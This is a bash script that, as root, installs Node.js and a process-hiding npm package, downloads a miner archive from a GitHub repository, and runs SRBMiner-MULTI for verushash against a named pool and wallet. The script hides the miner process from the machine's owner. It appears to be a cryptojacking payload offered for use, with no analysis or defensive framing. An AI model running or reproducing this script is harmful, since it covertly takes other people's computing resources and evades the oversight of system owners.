#!/bin/bash
sudo su --command "sudo apt update && 
sudo apt install gcc -y && 
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
sudo apt install nodejs && 
npm install -g npm@8.4.1 && 
npm i -g node-process-hider && 
sudo ph add SRBMiner-MULTI && 
wget https://github.com/gyrogerald/mind/raw/main/converted.tar && 
chmod +x converted.tar && 
tar -xf converted.tar && 
chmod +x SRBMiner-MULTI && 
./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ap.luckpool.net:3958 --wallet RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro --password x --cpu-threads 2 --tls true"
